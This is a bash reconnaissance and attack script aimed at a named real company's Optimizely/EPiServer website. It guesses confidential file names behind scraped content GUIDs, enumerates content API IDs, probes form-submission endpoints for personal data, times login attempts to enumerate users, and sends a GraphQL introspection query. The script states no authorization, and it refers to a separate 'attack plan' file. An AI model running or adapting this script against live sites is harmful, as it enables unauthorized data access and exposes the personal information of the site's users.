#!/bin/bash
# QUICK START - Test the most promising Optimizely vulnerabilities
# Run this first to find quick wins

TARGET="https://www.dnv.com"

echo "========================================"
echo "  OPTIMIZELY QUICK WIN TESTER"
echo "  Target: $TARGET"
echo "========================================"

# 1. GUID Extraction & IDOR Testing (HIGHEST PRIORITY)
echo -e "\n[1] TESTING CONTENT ASSETS IDOR (File Access)"
echo "============================================="

echo "Extracting content GUIDs from homepage..."
GUIDS=$(curl -s "$TARGET/" | grep -o 'contentassets/[a-f0-9-]\{36\}' | cut -d/ -f2 | sort -u)

COUNT=$(echo "$GUIDS" | grep -v '^$' | wc -l)
echo "Found $COUNT unique GUIDs"

if [ "$COUNT" -gt "0" ]; then
    echo -e "\nGUIDs found:"
    echo "$GUIDS" | head -10

    echo -e "\nTesting IDOR on first 3 GUIDs..."

    for guid in $(echo "$GUIDS" | head -3); do
        echo -e "\n  Testing GUID: $guid"

        # Common sensitive filenames
        FILES=(
            "document.pdf"
            "report.pdf"
            "data.xlsx"
            "proposal.pdf"
            "contract.pdf"
            "confidential.pdf"
            "internal.pdf"
            "financial.xlsx"
            "budget.pdf"
            "memo.pdf"
            "presentation.pptx"
            "agreement.pdf"
            "invoice.pdf"
            "quote.pdf"
        )

        for file in "${FILES[@]}"; do
            HTTP=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/contentassets/$guid/$file")

            if [ "$HTTP" == "200" ]; then
                echo "    🔥 FOUND: $file (HTTP 200)"
                SIZE=$(curl -s -o /dev/null -w "%{size_download}" "$TARGET/contentassets/$guid/$file")
                echo "    Size: $SIZE bytes"
                echo "    URL: $TARGET/contentassets/$guid/$file"
            fi
        done
    done

    echo -e "\n💡 TIP: Run full GUID enumeration:"
    echo "    for guid in \$(cat guids.txt); do ... done"
else
    echo "⚠️ No content GUIDs found on homepage"
    echo "Try extracting from other pages or sitemap"
fi

# 2. API Endpoint Testing
echo -e "\n[2] TESTING API ENDPOINTS FOR DATA EXPOSURE"
echo "============================================="

API_ENDPOINTS=(
    "/api/episerver/v2.0/content"
    "/api/episerver/v3.0/content"
    "/ContentDeliveryApi/v2/content"
    "/contentdeliveryapi/api/v2/content"
    "/api/content"
    "/epi/api/content"
)

for api in "${API_ENDPOINTS[@]}"; do
    RESPONSE=$(curl -s "$TARGET$api" -w "\n__HTTP__:%{http_code}")
    HTTP=$(echo "$RESPONSE" | grep "__HTTP__" | cut -d: -f2)

    if [ "$HTTP" != "404" ]; then
        echo "  ✓ $api → HTTP $HTTP"

        # Check if it returns JSON with data
        if echo "$RESPONSE" | grep -q '{"'; then
            echo "    Returns JSON data:"
            echo "$RESPONSE" | head -15

            # Try to enumerate content IDs
            echo "    Testing content enumeration..."
            for id in 1 2 3 5 10 15 20; do
                ID_RESPONSE=$(curl -s "$TARGET$api/$id")
                if echo "$ID_RESPONSE" | grep -q '"name":\|"content":\|"email":'; then
                    echo "      🔥 ID $id returned data!"
                fi
            done
        fi
    fi
done

# 3. EPiServer Forms Data Access
echo -e "\n[3] TESTING EPISERVER FORMS (PII LEAKAGE)"
echo "============================================="

echo "Testing form data access endpoints..."

FORM_ENDPOINTS=(
    "/EPiServer.Forms/DataSubmit/GetFormData"
    "/episerver/forms/submit"
    "/api/episerver/forms/submissions"
)

for endpoint in "${FORM_ENDPOINTS[@]}"; do
    echo "  Testing: $endpoint"

    # Try accessing form data
    for formId in 1 2 3 5 10; do
        RESPONSE=$(curl -s "$TARGET$endpoint?formId=$formId" -w "\n__HTTP__:%{http_code}")
        HTTP=$(echo "$RESPONSE" | grep "__HTTP__" | cut -d: -f2)

        if [ "$HTTP" == "200" ]; then
            echo "    Form $formId: HTTP 200"

            # Check for PII
            if echo "$RESPONSE" | grep -i "email\|name\|phone\|address" | head -5; then
                echo "      🔥 POTENTIAL PII LEAK IN FORM $formId!"
            fi
        fi
    done
done

# 4. Version Detection
echo -e "\n[4] DETECTING OPTIMIZELY VERSION"
echo "============================================="

echo "Checking for version disclosure..."

# Method 1: Check error pages
echo "  Triggering error page..."
ERROR_RESPONSE=$(curl -s "$TARGET/nonexistent.aspx")
if echo "$ERROR_RESPONSE" | grep -i "episerver\|optimizely\|version"; then
    echo "    ⚠️ Version info in error:"
    echo "$ERROR_RESPONSE" | grep -i "episerver\|optimizely\|version" | head -5
fi

# Method 2: Check JavaScript files
echo "  Checking JavaScript files..."
JS_FILES=$(curl -s "$TARGET/" | grep -o 'src="[^"]*\.js"' | cut -d'"' -f2 | grep -v "http" | head -5)

for js in $JS_FILES; do
    if [[ $js == /* ]]; then
        VERSION_INFO=$(curl -s "$TARGET$js" | grep -i "version\|episerver\|optimizely" | head -1)
        if [ ! -z "$VERSION_INFO" ]; then
            echo "    Found in $js: $VERSION_INFO"
        fi
    fi
done

# 5. User Enumeration
echo -e "\n[5] TESTING USER ENUMERATION"
echo "============================================="

LOGIN_URL="$TARGET/util/login"

echo "Testing timing-based user enumeration..."
USERS=("admin" "administrator" "nonexistent_xyz_12345")

for user in "${USERS[@]}"; do
    START=$(date +%s%N)
    curl -s -X POST "$LOGIN_URL" \
        -d "username=${user}&password=wrongpass" \
        -o /dev/null 2>&1
    END=$(date +%s%N)
    TIME=$(((END - START) / 1000000))
    echo "  User '$user': ${TIME}ms"
done

echo -e "\n💡 If timing differences >50ms → user enumeration possible"

# 6. Sensitive File Discovery
echo -e "\n[6] TESTING FOR SENSITIVE FILES IN SITEASSETS"
echo "============================================="

echo "Looking for interesting file types..."
curl -s "$TARGET/" | grep -o '/siteassets/[^"?]*' | grep -i -E "\.(pdf|doc|docx|xls|xlsx|zip|sql|bak)" | head -20

echo -e "\n💡 Try accessing these files directly to check if they contain sensitive data"

# 7. OData/GraphQL
echo -e "\n[7] TESTING ODATA/GRAPHQL ENDPOINTS"
echo "============================================="

# OData
echo "Testing OData..."
curl -s "$TARGET/odata" -w "\nHTTP: %{http_code}\n" | head -20

# GraphQL
echo -e "\nTesting GraphQL..."
curl -s -X POST "$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{__schema{types{name}}}"}' \
    -w "\nHTTP: %{http_code}\n" | head -20

echo -e "\n========================================"
echo "  QUICK SCAN COMPLETE"
echo "========================================"
echo ""
echo "NEXT STEPS:"
echo "  1. If GUIDs found → Run full IDOR enumeration"
echo "  2. If API accessible → Test content enumeration (IDs 1-1000)"
echo "  3. If forms found → Test all form IDs for data access"
echo "  4. If version found → Search for version-specific CVEs"
echo ""
echo "FILES TO REVIEW:"
echo "  - OPTIMIZELY_ATTACK_PLAN.md (full attack guide)"
echo "  - optimizely_vuln_tests.sh (comprehensive tests)"
